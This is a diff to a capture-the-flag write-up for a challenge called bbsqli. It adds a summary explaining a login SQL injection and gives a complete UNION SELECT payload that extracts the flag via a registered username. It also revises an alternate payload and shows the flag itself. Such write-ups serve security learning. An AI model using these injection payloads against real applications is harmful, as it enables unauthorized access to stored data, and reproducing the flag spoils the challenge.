@@ -6,6 +6,21 @@ Author: xhalyl
 
 http://45.129.40.107:9676/
 ```
+---
+
+**TL;DR** \
+An SQL injection during login, however the username from the _**DB**_ is checked
+against the username in the _**request**_, thus the SQLi has to return itself as
+the **username**. The flag will be inside the **email**.
+
+The final payload looks like this
+```
+" UNION SELECT users.username, flags.flag, users.password FROM users JOIN flags ON flags.id = 1 WHERE users.username LIKE '%findme%' --
+```
+Register an account with it as the *name* and then login into it.
+
+## Writeup
+
 Attached is `bbsqli.zip`, [containing](bbsqli):
 ```
 app.py
@@ -140,4 +155,4 @@ Success!
 
 **Flag:** L3ak{__V3RY_B4S1C_SQLI}
 
-> _**PS:**_ After the CTF I realized that we don't actually need a comment, as the content of `LIKE` already contains a string. So this would also work: `" UNION SELECT users.username, flags.flag AS email, users.password FROM users JOIN flags ON flags.id = 1 WHERE users.username LIKE '%findme%' --`
+> _**PS:**_ After the CTF I realized that we don't actually need a comment, as the content of `LIKE` already contains a string. So this would also work: `" UNION SELECT users.username, flags.flag, users.password FROM users JOIN flags ON flags.id = 1 WHERE users.username LIKE '%findme%' --`
